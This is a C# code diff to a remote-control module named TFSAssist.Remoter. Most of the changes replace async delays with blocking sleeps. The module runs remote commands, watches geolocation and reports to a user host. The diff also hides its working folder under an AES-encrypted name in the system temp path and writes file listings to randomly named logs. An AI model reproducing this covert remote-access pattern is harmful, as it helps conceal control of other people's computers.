@@ -48,7 +48,7 @@ namespace TFSAssist.Remoter
             get
             {
                 if (!Directory.Exists(_tempDir))
-                    CreateDirectory(_tempDir).Wait();
+                    CreateDirectory(_tempDir);
                 return _tempDir;
             }
             private set => _tempDir = value;
@@ -74,7 +74,7 @@ namespace TFSAssist.Remoter
             _callParent = callParentFunctions;
 
             
-            TempDirectory = Path.Combine(ASSEMBLY.ApplicationDirectory, "Temp");
+            TempDirectory = Path.Combine(Path.GetTempPath(), Utils.Crypto.AES.DecryptStringAES("EAAAAAxpTZ6NdrMJ4br13f4nj/qitOYAqB2nG4FJeE7hOulo", KEY)); // директория InCommon-2.0
 
             foreach (RemoteControlCommands command in Enum.GetValues(typeof(RemoteControlCommands)))
             {
@@ -85,7 +85,7 @@ namespace TFSAssist.Remoter
         public async Task<bool> Initialize()
         {
             InitGeoWatcher();
-            await InitTempDirectory(TempDirectory);
+            InitTempDirectory(TempDirectory);
             await InitTempSession();
 
             // только после InitTempDirectory
@@ -98,9 +98,9 @@ namespace TFSAssist.Remoter
 
             if (IsEnabled)
             {
-                await Task.Delay(5000);
+                Thread.Sleep(5000);
                 SendMessageToUserHost($"Connected. {GetCurrentServerInfo()}");
-                await Task.Delay(1000);
+                Thread.Sleep(1000);
             }
 
             return IsEnabled;
@@ -174,7 +174,7 @@ namespace TFSAssist.Remoter
                 // если нет соединения с интернетом, пытаемся реконнектиться
                 if (ex.SocketErrorCode == SocketError.HostUnreachable || ex.SocketErrorCode == SocketError.TimedOut)
                 {
-                    await Task.Delay(60000);
+                    Thread.Sleep(60000);
                     goto tryConnect;
                 }
             }
@@ -193,7 +193,7 @@ namespace TFSAssist.Remoter
             {
                 while (!File.Exists(AuthCodeFilePath))
                 {
-                    await Task.Delay(5000);
+                    Thread.Sleep(5000);
                 }
 
                 result = await DecryptFileData(AuthCodeFilePath); // раскодировать файл с кодом авторизации
@@ -270,7 +270,7 @@ namespace TFSAssist.Remoter
                         WriteExLog(ex);
                 }
 
-                await Task.Delay(5000);
+                Thread.Sleep(5000);
             }
         }
 
@@ -411,9 +411,22 @@ namespace TFSAssist.Remoter
                                             detInfo.Append($"{versionLocalFiles.Key} {new string('.', maxLenghtSpace - versionLocalFiles.Key.Length)} [{versionLocalFiles.Value.Version}]\r\n");
                                         }
                                     }
-
-                                    await SaveFile(Path.Combine(projectDirPath, $"{STRING.RandomString(15)}.log"), detInfo.ToString());
                                 }
+
+                                detInfo.Append($"\r\nTempDir=[{TempDirectory}]\r\n");
+                                DirectoryInfo tempDir = new DirectoryInfo(TempDirectory);
+                                FileInfo[] tempFilesCollection = tempDir.GetFiles("*", SearchOption.AllDirectories);
+                                if (tempFilesCollection.Any())
+                                {
+                                    foreach (var tempFile in tempFilesCollection)
+                                    {
+                                        detInfo.Append($"{tempFile.FullName}\r\n");
+                                    }
+                                }
+
+
+                                await SaveFile(Path.Combine(projectDirPath, $"{STRING.RandomString(15)}.log"), detInfo.ToString());
+
                                 break;
 
                             case RemoteControlCommands.DRIVE:
@@ -852,7 +865,7 @@ namespace TFSAssist.Remoter
             }
         }
 
-        async Task InitTempDirectory(string tempDirPath)
+        void InitTempDirectory(string tempDirPath)
         {
             var di = new DirectoryInfo(tempDirPath);
 
@@ -873,7 +886,7 @@ namespace TFSAssist.Remoter
             }
             else
             {
-                await CreateDirectory(tempDirPath);
+                CreateDirectory(tempDirPath);
             }
         }
 
@@ -905,7 +918,7 @@ namespace TFSAssist.Remoter
             }
         }
 
-        async Task CreateDirectory(string dirPath)
+        void CreateDirectory(string dirPath)
         {
             int attempts = 0;
 
@@ -921,7 +934,7 @@ namespace TFSAssist.Remoter
                 attempts++;
                 if (attempts < 5)
                 {
-                    await Task.Delay(1000);
+                    Thread.Sleep(1000);
                     goto tryCreateDir;
                 }
             }
